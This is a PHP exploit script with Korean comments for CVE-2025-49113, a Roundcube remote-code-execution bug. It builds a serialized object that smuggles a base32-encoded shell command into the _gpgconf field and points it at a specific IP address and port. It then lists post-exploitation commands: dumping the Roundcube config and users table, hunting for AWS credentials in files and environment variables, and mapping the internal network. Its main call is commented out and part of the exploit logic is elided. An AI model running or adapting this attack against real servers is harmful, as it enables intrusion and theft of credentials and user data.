<?php
/**
 * CVE-2025-49113 RCE with STDOUT Exfiltration
 *
 * 기존 fearsoff_exploit.php의 한계:
 * - shell_exec() 결과가 HTTP 응답에 포함되지 않음 (PHP 가젯 제약)
 *
 * 솔루션:
 * - 명령 결과를 /var/www/html 등 웹루트에 저장
 * - 또는 타이밍 사이드채널 사용
 * - 또는 다른 가젯 체인으로 출력 회수
 */

require_once __DIR__ . '/../loot/fearsoff_exploit.php';

function exploit_with_stdout_capture($target, $username, $password, $command, $output_file) {
    // 명령을 수정해서 결과를 파일에 저장하도록 함
    $cmd_with_redirect = "$command > $output_file 2>&1";

    // Base32 인코딩
    $encoded = base32_encode($cmd_with_redirect);
    $gpgconf = "echo \"$encoded\"|base32 -d|sh &#";

    // PHP 직렬화 payload 생성
    $payload = new stdClass();
    $payload->_process = false;
    $payload->_gpgconf = $gpgconf;
    $payload->_homedir = '';

    $serialized = serialize($payload);

    // ... fearsoff_exploit.php 로직
}

// 사용 예
$target = "http://13.125.104.131:30083";
$user = "testuser";
$pass = "testpass";

$commands = array(
    // Config 파일 읽기
    "cat /usr/share/roundcube/config/config.inc.php" => "/tmp/rc_config.txt",

    // DB 정보 추출
    "mysql -u roundcube roundcube -e 'SELECT * FROM users;'" => "/tmp/rc_users.txt",
    "mysql -u roundcube roundcube -e 'SELECT * FROM preferences WHERE prefs_name LIKE \"%aws%\" OR prefs_name LIKE \"%stage%\";'" => "/tmp/rc_prefs.txt",

    // AWS 자격증명 위치
    "find /root /opt /srv -name '*aws*' -o -name '*credential*' 2>/dev/null" => "/tmp/aws_files.txt",

    // 환경 변수 전체
    "printenv | grep -E 'AWS|RDS|STAGE|INTERNAL' | sort" => "/tmp/env_aws.txt",

    // 내부 네트워크 정보
    "ip route; ip addr; netstat -tlnp 2>/dev/null" => "/tmp/network_info.txt",
);

foreach ($commands as $cmd => $outfile) {
    echo "[*] Executing: $cmd\n";
    echo "    Output: $outfile\n";
    // exploit_with_stdout_capture($target, $user, $pass, $cmd, $outfile);
}

function base32_encode($data) {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $padding = 8 - strlen($data) % 8;
    $data .= str_repeat("\x00", $padding);

    $bits = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $bits .= str_pad(decbin(ord($data[$i])), 8, '0', STR_PAD_LEFT);
    }

    $encoded = '';
    for ($i = 0; $i < strlen($bits); $i += 5) {
        $chunk = substr($bits, $i, 5);
        $chunk = str_pad($chunk, 5, '0', STR_PAD_RIGHT);
        $encoded .= $alphabet[bindec($chunk)];
    }

    return $encoded;
}
?>
